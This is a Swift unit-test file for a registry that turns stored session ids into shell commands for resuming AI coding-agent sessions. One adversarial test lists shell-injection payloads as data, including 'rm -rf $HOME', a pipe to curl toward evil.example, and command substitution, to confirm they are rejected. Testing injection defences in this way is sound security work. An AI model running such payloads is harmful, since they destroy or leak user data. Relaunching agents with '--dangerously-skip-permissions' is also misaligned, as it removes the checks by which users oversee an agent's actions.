import XCTest

#if canImport(c11_DEV)
@testable import c11_DEV
#elseif canImport(c11)
@testable import c11
#endif

/// Pure, in-process tests for `AgentRestartRegistry`. The registry is a
/// value type with a closure-per-row; these tests exercise the Phase 1 `cc`
/// row and the lookup semantics that callers (the executor, the
/// `snapshot.restore` socket handler) rely on.
///
/// Per `CLAUDE.md`, never run locally — CI only.
final class AgentRestartRegistryTests: XCTestCase {

    // MARK: - Phase 1 claude row

    func testClaudeCodeWithSessionIdReturnsResumeCommandWithTrailingNewline() {
        let registry = AgentRestartRegistry.phase1
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "abc12345-ef67-890a-bcde-f0123456789a",
            metadata: [:]
        )
        // Exact-equal — the trailing newline is load-bearing. Without it
        // the synthesised command sits at the prompt unsubmitted and
        // resume silently no-ops.
        XCTAssertEqual(
            cmd,
            "claude --dangerously-skip-permissions --resume abc12345-ef67-890a-bcde-f0123456789a\n"
        )
    }

    /// Regression: the registry must NOT use the `cc` shorthand. In c11
    /// terminal environments `cc` resolves to the C compiler (clang), not
    /// Claude. The Phase 1 row must spell out `claude --dangerously-skip-permissions`
    /// so the wrapper at `Resources/bin/claude` handles the `--resume` path.
    func testPhase1RowDoesNotUseCcShorthand() {
        let registry = AgentRestartRegistry.phase1
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "abc12345-ef67-890a-bcde-f0123456789a",
            metadata: [:]
        ) ?? ""
        XCTAssertFalse(
            cmd.hasPrefix("cc "),
            "phase1 must not start with `cc ` (resolves to clang in c11 terminals)"
        )
        XCTAssertTrue(
            cmd.contains("claude --dangerously-skip-permissions --resume"),
            "phase1 must use `claude --dangerously-skip-permissions --resume`"
        )
    }

    func testClaudeCodeWithoutSessionIdDeclines() {
        let registry = AgentRestartRegistry.phase1
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: nil,
            metadata: [:]
        )
        XCTAssertNil(cmd, "missing session id → registry declines (nil)")
    }

    func testClaudeCodeWithEmptyWhitespaceSessionIdDeclines() {
        let registry = AgentRestartRegistry.phase1
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "   \t ",
            metadata: [:]
        )
        XCTAssertNil(cmd, "whitespace-only session id → registry declines (nil)")
    }

    func testClaudeCodeWithEmptySessionIdDeclines() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "",
            metadata: [:]
        ))
    }

    // MARK: - Type dispatch

    func testUnknownTerminalTypeReturnsNil() {
        let registry = AgentRestartRegistry.phase1
        // Use a type that is genuinely absent from the registry.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "cursor",
            sessionId: "anything",
            metadata: [:]
        ))
    }

    func testNilTerminalTypeReturnsNil() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertNil(registry.resolveCommand(
            terminalType: nil,
            sessionId: "anything",
            metadata: [:]
        ))
    }

    func testEmptyTerminalTypeReturnsNil() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertNil(registry.resolveCommand(
            terminalType: "  ",
            sessionId: "id",
            metadata: [:]
        ))
    }

    // MARK: - Named lookup (wire-format bridge)

    func testNamedPhase1ResolvesToPhase1Registry() throws {
        let registry = try XCTUnwrap(AgentRestartRegistry.named("phase1"))
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "cccc1111-2222-3333-4444-555566667777",
            metadata: [:]
        )
        XCTAssertEqual(
            cmd,
            "claude --dangerously-skip-permissions --resume cccc1111-2222-3333-4444-555566667777\n"
        )
    }

    func testNamedUnknownReturnsNilInsteadOfErroring() {
        XCTAssertNil(AgentRestartRegistry.named("phase99"))
        XCTAssertNil(AgentRestartRegistry.named(nil))
    }

    // MARK: - B1 adversarial — registry rejects non-UUID session ids

    /// Defence-in-depth: the store also rejects these at write time, but the
    /// registry closure re-validates. Any future in-process writer that
    /// bypasses the store must not become a command-injection vector.
    func testRegistryRejectsShellMetacharactersInSessionId() {
        let registry = AgentRestartRegistry.phase1
        let payloads = [
            "fake; rm -rf $HOME",
            "abc | curl evil.example/x",
            "abc`whoami`",
            "abc$(whoami)",
            "abc && touch /tmp/pwned",
            "abc > /tmp/out",
            "abc < /etc/passwd",
            "abc & sleep 1"
        ]
        for payload in payloads {
            XCTAssertNil(
                registry.resolveCommand(
                    terminalType: "claude-code",
                    sessionId: payload,
                    metadata: [:]
                ),
                "payload '\(payload)' must not synthesise a command"
            )
        }
    }

    func testRegistryRejectsEmbeddedNewlineInSessionId() {
        let registry = AgentRestartRegistry.phase1
        // Trimming strips leading/trailing whitespace but `\n` inside the
        // value is preserved — a newline mid-id would submit the first half
        // as a command and the remainder as a second line.
        let uuid = "aaaa1111-2222-3333-4444-555566667777"
        let withEmbeddedNewline = uuid + "\n rm -rf ~"
        XCTAssertNil(
            registry.resolveCommand(
                terminalType: "claude-code",
                sessionId: withEmbeddedNewline,
                metadata: [:]
            ),
            "embedded newline must not survive the validator"
        )
    }

    func testRegistryRejectsLengthBeyondPlausibleUUID() {
        let registry = AgentRestartRegistry.phase1
        // > 128 chars.
        let huge = String(repeating: "a", count: 200)
        XCTAssertNil(
            registry.resolveCommand(
                terminalType: "claude-code",
                sessionId: huge,
                metadata: [:]
            )
        )
    }

    func testRegistryRejectsEmptyAfterTrim() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertNil(
            registry.resolveCommand(
                terminalType: "claude-code",
                sessionId: "\n\t   \t\n",
                metadata: [:]
            )
        )
    }

    func testRegistryRejectsHexTooShortOrTooLong() {
        let registry = AgentRestartRegistry.phase1
        // Too short in each segment.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "abc-1111-2222-3333-444455556666",
            metadata: [:]
        ))
        // Too long in the last segment.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "aaaaaaaa-1111-2222-3333-444455556666ff",
            metadata: [:]
        ))
        // Missing a segment.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "aaaaaaaa-1111-2222-3333",
            metadata: [:]
        ))
    }

    func testRegistryRejectsWrongSeparatorsInSessionId() {
        let registry = AgentRestartRegistry.phase1
        // Underscores instead of dashes.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "aaaa1111_2222_3333_4444_555566667777",
            metadata: [:]
        ))
        // Space-separated.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "aaaa1111 2222 3333 4444 555566667777",
            metadata: [:]
        ))
        // Dots instead of dashes.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "aaaa1111.2222.3333.4444.555566667777",
            metadata: [:]
        ))
    }

    func testRegistryRejectsNonHexInSessionId() {
        let registry = AgentRestartRegistry.phase1
        // Uppercase G is not hex.
        XCTAssertNil(registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "gggghhhh-1111-2222-3333-444455556666",
            metadata: [:]
        ))
    }

    func testRegistryAcceptsMixedCaseUUID() {
        let registry = AgentRestartRegistry.phase1
        let cmd = registry.resolveCommand(
            terminalType: "claude-code",
            sessionId: "AaBbCcDd-1111-2222-3333-AABBCCDDEEFF",
            metadata: [:]
        )
        XCTAssertEqual(
            cmd,
            "claude --dangerously-skip-permissions --resume AaBbCcDd-1111-2222-3333-AABBCCDDEEFF\n",
            "UUID grammar is case-insensitive for hex"
        )
    }

    // MARK: - Phase 5: codex / opencode / kimi rows

    /// Codex uses best-effort `--last` semantics regardless of session id.
    func testCodexRowReturnsBestEffortLastCommand() {
        let registry = AgentRestartRegistry.phase1
        // Returns the command regardless of whether a session id is present.
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "codex", sessionId: nil, metadata: [:]),
            "codex resume --last\n",
            "codex row returns best-effort resume --last even without session id"
        )
        XCTAssertEqual(
            registry.resolveCommand(
                terminalType: "codex",
                sessionId: "abc12345-ef67-890a-bcde-f0123456789a",
                metadata: [:]
            ),
            "codex resume --last\n",
            "codex row ignores session id and always returns resume --last"
        )
    }

    /// Opencode has no verified resume flag — launches fresh.
    func testOpencodeRowReturnsBareCommand() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "opencode", sessionId: nil, metadata: [:]),
            "opencode\n",
            "opencode row returns bare launch (no resume flag)"
        )
        XCTAssertEqual(
            registry.resolveCommand(
                terminalType: "opencode",
                sessionId: "11111111-2222-3333-4444-555566667777",
                metadata: [:]
            ),
            "opencode\n",
            "opencode row ignores session id and returns bare launch"
        )
    }

    /// Kimi has no verified resume flag — launches fresh.
    func testKimiRowReturnsBareCommand() {
        let registry = AgentRestartRegistry.phase1
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "kimi", sessionId: nil, metadata: [:]),
            "kimi\n",
            "kimi row returns bare launch (no resume flag)"
        )
        XCTAssertEqual(
            registry.resolveCommand(
                terminalType: "kimi",
                sessionId: "aaaabbbb-cccc-dddd-eeee-ffff00001111",
                metadata: [:]
            ),
            "kimi\n",
            "kimi row ignores session id and returns bare launch"
        )
    }

    // MARK: - Symmetric trim on insert and lookup

    /// `resolveCommand` trims the query side (`terminalType?.trimmingCharacters(...)`).
    /// `init(rows:)` must trim on insert so a row registered with surrounding
    /// whitespace is still resolvable. Otherwise a typo in a future Phase 5
    /// row definition silently disables it.
    func testCustomRegistryTrimsTerminalTypeOnInsert() {
        let registry = AgentRestartRegistry(name: "trim-test", rows: [
            AgentRestartRegistry.Row(terminalType: "  claude-code  ") { _, _ in "cc trimmed" }
        ])
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "claude-code", sessionId: nil, metadata: [:]),
            "cc trimmed",
            "row registered with surrounding whitespace must still match an un-padded lookup"
        )
    }

    // MARK: - Custom row (Phase 5 shape preview)

    func testCustomRegistryCanCarryAdditionalRows() {
        let registry = AgentRestartRegistry(name: "multi-row-test", rows: [
            AgentRestartRegistry.Row(terminalType: "claude-code") { _, _ in "cc" },
            AgentRestartRegistry.Row(terminalType: "codex") { sid, _ in
                guard let sid else { return nil }
                return "codex resume \(sid)"
            }
        ])
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "codex", sessionId: "c-42", metadata: [:]),
            "codex resume c-42"
        )
        XCTAssertEqual(
            registry.resolveCommand(terminalType: "claude-code", sessionId: nil, metadata: [:]),
            "cc"
        )
        XCTAssertNil(
            registry.resolveCommand(terminalType: "kimi", sessionId: "k-1", metadata: [:]),
            "unknown type still returns nil even with multi-row registry"
        )
    }
}
